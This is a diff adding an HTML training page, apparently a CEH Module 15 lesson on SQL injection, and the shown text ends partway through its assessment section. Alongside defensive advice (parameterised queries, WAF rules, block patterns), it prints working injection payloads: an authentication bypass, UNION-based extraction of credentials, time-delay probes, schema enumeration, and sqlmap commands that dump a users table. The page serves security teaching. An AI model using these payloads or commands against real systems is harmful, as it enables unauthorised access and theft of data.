@@ -1,0 +1,1748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH v13 Module 15 - SQL Injection</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --warning-color: #f39c12;
+            --success-color: #27ae60;
+            --dark-bg: #1a1a1a;
+            --card-bg: #ffffff;
+            --text-primary: #333;
+            --text-secondary: #666;
+            --border-color: #ddd;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-primary);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+            box-shadow: 0 4px 20px var(--shadow-color);
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 1rem;
+        }
+
+        .progress-container {
+            max-width: 600px;
+            margin: 1rem auto 0;
+            background: rgba(255,255,255,0.2);
+            border-radius: 25px;
+            padding: 8px;
+        }
+
+        .progress-bar {
+            height: 20px;
+            background: linear-gradient(90deg, var(--success-color), var(--warning-color));
+            border-radius: 15px;
+            width: 0%;
+            transition: width 0.8s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .navigation {
+            background: white;
+            padding: 1rem 0;
+            box-shadow: 0 2px 10px var(--shadow-color);
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .nav-btn {
+            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            color: var(--text-primary);
+            text-decoration: none;
+            display: inline-block;
+            font-size: 0.9rem;
+        }
+
+        .nav-btn:hover {
+            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
+        }
+
+        .nav-btn.active {
+            background: linear-gradient(135deg, var(--accent-color), #c0392b);
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .content-area {
+            background: white;
+            margin: 2rem auto;
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 0 8px 30px var(--shadow-color);
+            min-height: 70vh;
+        }
+
+        .module-section {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .module-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-title {
+            font-size: 2.2rem;
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 80px;
+            height: 4px;
+            background: var(--accent-color);
+            margin: 0.5rem auto;
+            border-radius: 2px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 15px var(--shadow-color);
+            border-left: 4px solid var(--secondary-color);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px var(--shadow-color);
+        }
+
+        .card h3 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+            font-size: 1.4rem;
+        }
+
+        .card p {
+            color: var(--text-secondary);
+            margin-bottom: 1rem;
+            text-align: justify;
+        }
+
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .attack-type-card {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .attack-type-card:hover {
+            transform: scale(1.05);
+        }
+
+        .tool-card {
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            color: white;
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+        }
+
+        .tool-card h4 {
+            margin-bottom: 0.5rem;
+            font-size: 1.3rem;
+        }
+
+        .code-block {
+            background: var(--dark-bg);
+            color: #00ff00;
+            padding: 1rem;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 1rem 0;
+            overflow-x: auto;
+            border-left: 4px solid var(--accent-color);
+        }
+
+        .quiz-container {
+            margin: 1.5rem 0;
+        }
+
+        .quiz-question {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .quiz-options {
+            list-style: none;
+            padding: 0;
+        }
+
+        .quiz-options li {
+            background: white;
+            margin: 0.5rem 0;
+            padding: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .quiz-options li:hover {
+            background: #e8f4fd;
+            border-color: var(--secondary-color);
+        }
+
+        .quiz-options li.selected {
+            background: var(--secondary-color);
+            color: white;
+        }
+
+        .quiz-options li.correct {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .quiz-options li.incorrect {
+            background: var(--accent-color);
+            color: white;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, var(--accent-color), #c0392b);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, var(--success-color), #1e8449);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content {
+            background-color: white;
+            margin: 5% auto;
+            padding: 2rem;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .close:hover {
+            color: var(--accent-color);
+        }
+
+        .certification-badge {
+            background: linear-gradient(135deg, gold, #ffd700);
+            color: var(--dark-bg);
+            padding: 2rem;
+            border-radius: 15px;
+            text-align: center;
+            margin: 2rem 0;
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.3);
+        }
+
+        .progress-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--primary-color);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            z-index: 999;
+        }
+
+        .vulnerability-demo {
+            background: linear-gradient(135deg, #ff9a9e, #fecfef);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+        }
+
+        .countermeasure-card {
+            background: linear-gradient(135deg, #a8edea, #fed6e3);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 { font-size: 2rem; }
+            .section-title { font-size: 1.8rem; }
+            .grid-container { grid-template-columns: 1fr; }
+            .navigation { flex-direction: column; align-items: center; }
+            .progress-indicator { display: none; }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--secondary-color);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔍 CEH v13 Module 15</h1>
+            <p>SQL Injection Attacks & Advanced Exploitation Techniques</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p id="progressText">Progress: 0% Complete</p>
+            <div style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.8);">
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    ← → Navigate Sections
+                </span>
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    Esc Close Modal
+                </span>
+            </div>
+        </div>
+
+        <div class="navigation">
+            <button class="nav-btn active" onclick="showSection('overview')">📋 Overview</button>
+            <button class="nav-btn" onclick="showSection('sql-basics')">🔧 SQL Fundamentals</button>
+            <button class="nav-btn" onclick="showSection('injection-types')">💉 Injection Types</button>
+            <button class="nav-btn" onclick="showSection('exploitation')">⚡ Exploitation</button>
+            <button class="nav-btn" onclick="showSection('tools')">🛠️ Attack Tools</button>
+            <button class="nav-btn" onclick="showSection('detection')">🔍 Detection</button>
+            <button class="nav-btn" onclick="showSection('countermeasures')">🛡️ Countermeasures</button>
+            <button class="nav-btn" onclick="showSection('assessment')">📝 Assessment</button>
+            <button class="nav-btn" onclick="showSection('certification')">🏆 Certification</button>
+        </div>
+
+        <div class="content-area">
+            <!-- Overview Section -->
+            <div id="overview" class="module-section active">
+                <h2 class="section-title">🎯 SQL Injection Overview</h2>
+                
+                <div class="card">
+                    <h3>💉 Understanding SQL Injection</h3>
+                    <p>SQL injection is a code injection technique that exploits a security vulnerability in a website or application's software. It is one of the most powerful and dangerous hacking techniques, giving cybercriminals a direct path to exploit databases and steal sensitive information.</p>
+                    <p>This module provides comprehensive coverage of SQL injection attacks, methodologies, tools, and defensive strategies essential for ethical hackers and security professionals.</p>
+                </div>
+
+                <div class="grid-container">
+                    <div class="attack-type-card" onclick="showInfo('sqlBasics')">
+                        <h3>🎯 Learning Objectives</h3>
+                        <p>Master SQL fundamentals, injection techniques, exploitation methods, and countermeasures</p>
+                    </div>
+                    
+                    <div class="attack-type-card" onclick="showInfo('threatLandscape')">
+                        <h3>⚠️ Threat Impact</h3>
+                        <p>Understand the devastating consequences of SQL injection vulnerabilities</p>
+                    </div>
+                    
+                    <div class="attack-type-card" onclick="showInfo('moduleStructure')">
+                        <h3>📚 Module Structure</h3>
+                        <p>Comprehensive 3-hour learning journey through SQL injection mastery</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎓 What You'll Master</h3>
+                    <div class="grid-container">
+                        <div style="background: linear-gradient(135deg, #74b9ff, #0984e3); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>SQL Fundamentals</strong><br>
+                            Database structures, query language, and data manipulation commands
+                        </div>
+                        <div style="background: linear-gradient(135deg, #fd79a8, #e84393); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>Injection Techniques</strong><br>
+                            In-band, blind, and out-of-band injection methodologies
+                        </div>
+                        <div style="background: linear-gradient(135deg, #fdcb6e, #e17055); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>Exploitation Tools</strong><br>
+                            SQLmap, Havij, SQLninja, and advanced automation frameworks
+                        </div>
+                        <div style="background: linear-gradient(135deg, #55a3ff, #003d82); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>Defense Strategies</strong><br>
+                            Input validation, parameterized queries, and secure coding practices
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('sql-basics')">Start Learning Journey →</button>
+            </div>
+
+            <!-- SQL Basics Section -->
+            <div id="sql-basics" class="module-section">
+                <h2 class="section-title">🔧 SQL Fundamentals</h2>
+
+                <div class="card">
+                    <h3>🎯 Structured Query Language (SQL)</h3>
+                    <p>Structured Query Language (SQL) is a special language used to communicate with databases. It includes commands like INSERT, SELECT, UPDATE, and DELETE, which are used to add, retrieve, modify, and remove data in the database.</p>
+                </div>
+
+                <div class="grid-container">
+                    <div class="card">
+                        <h3>📊 Core SQL Commands</h3>
+                        <div class="code-block">
+SELECT * FROM users;<br>
+INSERT INTO users VALUES ('admin', 'password');<br>
+UPDATE users SET password = 'newpass' WHERE id = 1;<br>
+DELETE FROM users WHERE id = 2;
+                        </div>
+                        <p><strong>Key Operations:</strong> Data retrieval, insertion, modification, and deletion</p>
+                    </div>
+
+                    <div class="card">
+                        <h3>🏗️ Database Architecture</h3>
+                        <ul style="padding-left: 20px; line-height: 1.8;">
+                            <li><strong>Tables:</strong> Organized data structures</li>
+                            <li><strong>Columns:</strong> Data field definitions</li>
+                            <li><strong>Rows:</strong> Individual data records</li>
+                            <li><strong>Relationships:</strong> Inter-table connections</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="vulnerability-demo">
+                    <h3>⚠️ SQL Vulnerability Example</h3>
+                    <p><strong>Vulnerable Query:</strong></p>
+                    <div class="code-block">
+"SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "';"
+                    </div>
+                    <p><strong>Attack Input:</strong> <code>admin' --</code></p>
+                    <p><strong>Resulting Query:</strong></p>
+                    <div class="code-block">
+SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
+                    </div>
+                    <p><strong>Result:</strong> Authentication bypassed - the password check is commented out!</p>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('injection-types')">Next: Injection Types →</button>
+            </div>
+
+            <!-- Injection Types Section -->
+            <div id="injection-types" class="module-section">
+                <h2 class="section-title">💉 SQL Injection Types</h2>
+
+                <div class="card">
+                    <h3>🎯 Classification of SQL Injection Attacks</h3>
+                    <p>SQL injection attacks are classified based on how data is extracted and the communication channels used.</p>
+                </div>
+
+                <div class="grid-container">
+                    <div class="attack-type-card" onclick="showInfo('inBandAttacks')">
+                        <h3>📡 In-Band SQL Injection</h3>
+                        <p>Uses same communication channel for attack and data retrieval</p>
+                        <small>Error-based • Union-based • Most common</small>
+                    </div>
+
+                    <div class="attack-type-card" onclick="showInfo('blindAttacks')">
+                        <h3>🔍 Blind SQL Injection</h3>
+                        <p>No direct data output - relies on application behavior</p>
+                        <small>Boolean-based • Time-based • Inferential</small>
+                    </div>
+
+                    <div class="attack-type-card" onclick="showInfo('outOfBandAttacks')">
+                        <h3>🌐 Out-of-Band SQL Injection</h3>
+                        <p>Uses different channels for attack and data exfiltration</p>
+                        <small>DNS • HTTP requests • File operations</small>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 In-Band Attack Techniques</h3>
+                    <div class="grid-container">
+                        <div class="tool-card">
+                            <h4>❌ Error-Based SQL Injection</h4>
+                            <p>An attacker deliberately injects malicious inputs into an application to trigger database errors. By examining the error messages returned, the attacker identifies an SQL injection vulnerability within the application.</p>
+                            <div class="code-block">
+' OR 1=1 --<br>
+' AND (SELECT COUNT(*) FROM information_schema.tables)=1 --
+                            </div>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🔗 Union-Based SQL Injection</h4>
+                            <p>An attacker uses a UNION clause to append a malicious query to the requested query. The UNION statement is useful because it splices the results of one query into another.</p>
+                            <div class="code-block">
+' UNION SELECT username, password FROM users --<br>
+' UNION SELECT 1,2,3,database(),version() --
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>👁️ Blind Attack Methodologies</h3>
+                    <p>In case of blind SQL injection, no data is transmitted through the web application, and it is not possible for an attacker to retrieve the actual result of the injection. Attackers can steal data by asking a series of true or false questions through SQL statements.</p>
+                    
+                    <div class="vulnerability-demo">
+                        <h4>⏱️ Time-Based Blind Injection</h4>
+                        <div class="code-block">
+' OR (SELECT SLEEP(5)) --<br>
+' OR (SELECT BENCHMARK(5000000, MD5('test'))) --<br>
+'; WAITFOR DELAY '00:00:05' --
+                        </div>
+                        <p>Time delay SQL injection evaluates the time delay that occurs in response to true or false queries sent to the database. A WAITFOR statement stops SQL Server for a specific amount of time.</p>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('exploitation')">Next: Exploitation Methods →</button>
+            </div>
+
+            <!-- Exploitation Section -->
+            <div id="exploitation" class="module-section">
+                <h2 class="section-title">⚡ Exploitation Techniques</h2>
+
+                <div class="card">
+                    <h3>🎯 SQL Injection Methodology</h3>
+                    <p>Here's how an SQL injection attack typically works: A hacker finds a web application that uses SQL to interact with its database.</p>
+                </div>
+
+                <div class="grid-container">
+                    <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 20px; border-radius: 10px;">
+                        <strong>1. Information Gathering</strong><br>
+                        Identify input points, database type, and application behavior
+                    </div>
+                    <div style="background: linear-gradient(135deg, #f093fb, #f5576c); color: white; padding: 20px; border-radius: 10px;">
+                        <strong>2. Vulnerability Detection</strong><br>
+                        Test for SQL injection using single quotes and error messages
+                    </div>
+                    <div style="background: linear-gradient(135deg, #4facfe, #00f2fe); color: white; padding: 20px; border-radius: 10px;">
+                        <strong>3. Data Enumeration</strong><br>
+                        Extract database schemas, tables, and sensitive information
+                    </div>
+                    <div style="background: linear-gradient(135deg, #fa709a, #fee140); color: white; padding: 20px; border-radius: 10px;">
+                        <strong>4. Privilege Escalation</strong><br>
+                        Attempt administrative access and system compromise
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 Information Gathering Techniques</h3>
+                    <div class="vulnerability-demo">
+                        <h4>Database Fingerprinting</h4>
+                        <div class="code-block">
+-- MySQL<br>
+' UNION SELECT @@version --<br>
+<br>
+-- SQL Server<br>
+' UNION SELECT @@version --<br>
+<br>
+-- Oracle<br>
+' UNION SELECT banner FROM v$version --<br>
+<br>
+-- PostgreSQL<br>
+' UNION SELECT version() --
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📊 Schema Enumeration</h3>
+                    <p>Extract database structure and table information:</p>
+                    <div class="code-block">
+-- List databases<br>
+' UNION SELECT schema_name FROM information_schema.schemata --<br>
+<br>
+-- List tables<br>
+' UNION SELECT table_name FROM information_schema.tables --<br>
+<br>
+-- List columns<br>
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⚠️ Attack Impact Categories</h3>
+                    <div class="grid-container">
+                        <div class="countermeasure-card">
+                            <h4>🔓 Information Disclosure</h4>
+                            <p>Attackers can retrieve sensitive information stored in the database, such as personal details and financial data.</p>
+                        </div>
+                        <div class="countermeasure-card">
+                            <h4>🔧 Data Integrity Compromise</h4>
+                            <p>Hackers can modify or delete data, deface websites or alter important records.</p>
+                        </div>
+                        <div class="countermeasure-card">
+                            <h4>⚡ Remote Code Execution</h4>
+                            <p>In some cases, attackers can execute malicious code on the server, potentially compromising the entire system.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('tools')">Next: Attack Tools →</button>
+            </div>
+
+            <!-- Tools Section -->
+            <div id="tools" class="module-section">
+                <h2 class="section-title">🛠️ SQL Injection Tools</h2>
+
+                <div class="card">
+                    <h3>⚡ Automated SQL Injection Tools</h3>
+                    <p>Professional penetration testing requires sophisticated tools for efficient SQL injection detection and exploitation.</p>
+                </div>
+
+                <div class="tool-card">
+                    <h4>🐍 SQLmap - The Gold Standard</h4>
+                    <p>SQLmap is an open-source tool that automates the detection and exploitation of SQL injections. It is a comprehensive tool offering a multitude of features and options that can go as far as compromising the SQL server if conditions allow.</p>
+                    
+                    <div class="card">
+                        <h4>Key Features:</h4>
+                        <ul style="padding-left: 20px; line-height: 1.8;">
+                            <li><strong>Database Support:</strong> MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, and more</li>
+                            <li><strong>Injection Types:</strong> Boolean-based blind, time-based blind, error-based, UNION query-based</li>
+                            <li><strong>Advanced Features:</strong> Database fingerprinting, data enumeration, file system access</li>
+                        </ul>
+                        
+                        <h4>Basic Usage Examples:</h4>
+                        <div class="code-block">
+# Basic URL testing<br>
+sqlmap -u "http://target.com/page.php?id=1"<br>
+<br>
+# Test with POST data<br>
+sqlmap -u "http://target.com/login.php" --data "username=admin&password=test"<br>
+<br>
+# Enumerate databases<br>
+sqlmap -u "http://target.com/page.php?id=1" --dbs<br>
+<br>
+# Dump specific table<br>
+sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tool-card">
+                    <h4>⚡ Havij - User-Friendly Exploitation</h4>
+                    <p>Developed by Iranian cyber experts, Havij instantly determines the database details of the target system by quickly getting through its security layers. The easy-to-operate program, together with the free version and quick analysis, makes Havij one of the most common tools for automated SQL Injection.</p>
+                    
+                    <div class="vulnerability-demo">
+                        <h4>Havij Capabilities:</h4>
+                        <ul style="padding-left: 20px; line-height: 1.8;">
+                            <li>GUI-based operation for ease of use</li>
+                            <li>Automatic database detection and enumeration</li>
+                            <li>Table and column extraction</li>
+                            <li>Data dumping capabilities</li>
+                            <li>Support for GET/POST parameters and cookies</li>
+                        </ul>
+                        <p><strong>Detection Signature:</strong> <code>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij</code></p>
+                    </div>
+                </div>
+
+                <div class="grid-container">
+                    <div class="tool-card">
+                        <h4>🔍 SQLninja</h4>
+                        <p>SQLninja is a SQL injection tool that exploits web applications that use a SQL server as a database server. The overall aim of the tool is to allow the attacker to gain remote access to a SQL database server.</p>
+                    </div>
+
+                    <div class="tool-card">
+                        <h4>☕ jSQL Injection</h4>
+                        <p>jSQL Injection is an open-source, lightweight application for detecting and exploiting SQL injection vulnerabilities in web applications.</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Tool Selection Strategy</h3>
+                    <div class="grid-container">
+                        <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 15px; border-radius: 8px;">
+                            <strong>Automated Testing:</strong> SQLmap, Havij for comprehensive scans
+                        </div>
+                        <div style="background: linear-gradient(135deg, #f093fb, #f5576c); color: white; padding: 15px; border-radius: 8px;">
+                            <strong>Manual Testing:</strong> Burp Suite, OWASP ZAP for precise control
+                        </div>
+                        <div style="background: linear-gradient(135deg, #4facfe, #00f2fe); color: white; padding: 15px; border-radius: 8px;">
+                            <strong>Specific Databases:</strong> SQLninja for SQL Server, NoSQLMap for NoSQL
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('detection')">Next: Detection Methods →</button>
+            </div>
+
+            <!-- Detection Section -->
+            <div id="detection" class="module-section">
+                <h2 class="section-title">🔍 SQL Injection Detection</h2>
+
+                <div class="card">
+                    <h3>🎯 Detection Methodology</h3>
+                    <p>Identifying SQL injection vulnerabilities requires systematic testing of all input vectors and careful analysis of application responses.</p>
+                </div>
+
+                <div class="vulnerability-demo">
+                    <h3>🔍 Basic Detection Techniques</h3>
+                    <h4>1. Single Quote Test</h4>
+                    <p>Basic test to see if SQL injection is possible is just inserting a single quote (')</p>
+                    <div class="code-block">
+Original: http://example.com/product.php?id=1<br>
+Test: http://example.com/product.php?id=1'
+                    </div>
+                    <p><strong>Expected Result:</strong> Database error or different page behavior</p>
+
+                    <h4>2. Logical Test</h4>
+                    <div class="code-block">
+True condition: id=1 OR 1=1<br>
+False condition: id=1 AND 1=2<br>
+Comment injection: id=1--<br>
+Time delay: id=1; WAITFOR DELAY '00:00:05'--
+                    </div>
+                </div>
+
+                <div class="grid-container">
+                    <div class="card">
+                        <h3>📊 Error-Based Detection</h3>
+                        <p>Analyze database error messages for vulnerability confirmation:</p>
+                        <div class="code-block">
+MySQL Error:<br>
+"You have an error in your SQL syntax"<br>
+<br>
+SQL Server Error:<br>
+"Unclosed quotation mark after the character string"<br>
+<br>
+Oracle Error:<br>
+"ORA-00933: SQL command not properly ended"
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h3>⏱️ Time-Based Detection</h3>
+                        <p>Use timing attacks when error messages are suppressed:</p>
+                        <div class="code-block">
+-- MySQL<br>
+SELECT SLEEP(5);<br>
+<br>
+-- SQL Server<br>
+WAITFOR DELAY '00:00:05';<br>
+<br>
+-- PostgreSQL<br>
+SELECT pg_sleep(5);
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Advanced Detection Methods</h3>
+                    <div class="countermeasure-card">
+                        <h4>Boolean-Based Detection</h4>
+                        <p>An attacker sends multiple valid SQL statements that evaluate to true and false and notes the response in the web page to determine the presence of a SQL injection vulnerability.</p>
+                        <div class="code-block">
+id=1 AND 1=1 (should return normal page)<br>
+id=1 AND 1=2 (should return different/error page)
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('countermeasures')">Next: Countermeasures →</button>
+            </div>
+
+            <!-- Countermeasures Section -->
+            <div id="countermeasures" class="module-section">
+                <h2 class="section-title">🛡️ SQL Injection Countermeasures</h2>
+
+                <div class="card">
+                    <h3>🎯 Comprehensive Defense Strategy</h3>
+                    <p>To defend against SQL injection, the developer needs to take proper care in configuring and developing an application to create one that is robust and secure.</p>
+                </div>
+
+                <div class="grid-container">
+                    <div class="countermeasure-card">
+                        <h4>🔧 Parameterized Queries</h4>
+                        <p>The most effective defense against SQL injection attacks:</p>
+                        <div class="code-block">
+// Vulnerable Code<br>
+String query = "SELECT * FROM users WHERE id = " + userInput;<br>
+<br>
+// Secure Code (Java)<br>
+String query = "SELECT * FROM users WHERE id = ?";<br>
+PreparedStatement stmt = conn.prepareStatement(query);<br>
+stmt.setString(1, userInput);
+                        </div>
+                    </div>
+
+                    <div class="countermeasure-card">
+                        <h4>✅ Input Validation</h4>
+                        <p>Test the size and data type of the input and enforce appropriate limits. Test the content of string variables and accept only expected values.</p>
+                        <div class="code-block">
+// Whitelist validation<br>
+if (userInput.matches("[a-zA-Z0-9]+")) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;// Process input<br>
+} else {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;// Reject input<br>
+}
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🛠️ Implementation Best Practices</h3>
+                    <div class="grid-container">
+                        <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>1. Stored Procedures</strong><br>
+                            Use database stored procedures with proper parameter handling
+                        </div>
+                        <div style="background: linear-gradient(135deg, #f093fb, #f5576c); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>2. Escape Characters</strong><br>
+                            Properly escape special characters in user input
+                        </div>
+                        <div style="background: linear-gradient(135deg, #4facfe, #00f2fe); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>3. Least Privilege</strong><br>
+                            Run database connections with minimal required permissions
+                        </div>
+                        <div style="background: linear-gradient(135deg, #fa709a, #fee140); color: white; padding: 20px; border-radius: 10px;">
+                            <strong>4. Error Handling</strong><br>
+                            Implement custom error pages that don't reveal database structure
+                        </div>
+                    </div>
+                </div>
+
+                <div class="vulnerability-demo">
+                    <h3>🔒 Advanced Security Measures</h3>
+                    <p>Some countermeasures to defend against SQL injection attacks include:</p>
+                    <ul style="padding-left: 20px; line-height: 1.8;">
+                        <li><strong>Network Security:</strong> Use firewalls and intrusion detection systems</li>
+                        <li><strong>Code Review:</strong> Perform static source code analysis</li>
+                        <li><strong>Testing:</strong> Automated black box injection testing</li>
+                        <li><strong>Monitoring:</strong> Real-time database activity monitoring</li>
+                        <li><strong>Encryption:</strong> Use secure hash algorithms for password storage</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Web Application Firewalls (WAF)</h3>
+                    <p>Deploy WAF solutions to filter malicious requests:</p>
+                    <div class="code-block">
+ModSecurity Rules:<br>
+SecRule ARGS "@detectSQLi" "id:1001,phase:2,block,msg:'SQL Injection Attack'"<br>
+<br>
+Common Patterns to Block:<br>
+- Single quotes followed by OR statements<br>
+- UNION SELECT statements<br>
+- Comment strings (-- and /*)<br>
+- Time delay functions
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('assessment')">Next: Assessment →</button>
+            </div>
+
+            <!-- Assessment Section -->
+            <div id="assessment" class="module-section">
+                <h2 class="section-title">📝 SQL Injection Assessment</h2>
+
+                <div class="card">
+                    <h3>🎯 Comprehensive SQL Injection Evaluation</h3>
+                    <p>Test your knowledge of SQL injection attacks, exploitation techniques, tools, and countermeasures. This assessment covers all module content with practical scenarios.</p>
+                    
+                    <div style="background: linear-gradient(135deg, rgba(52, 152, 219, 0.1), rgba(41, 128, 185, 0.1)); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                        <strong>Assessment Details:</strong>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>20 multiple-choice questions</li>
+                            <li>Passing score: 80% (16/20 correct)</li>
+                            <li>Time limit: 30 minutes</li>
+                            <li>Covers all Module 15 topics</li>
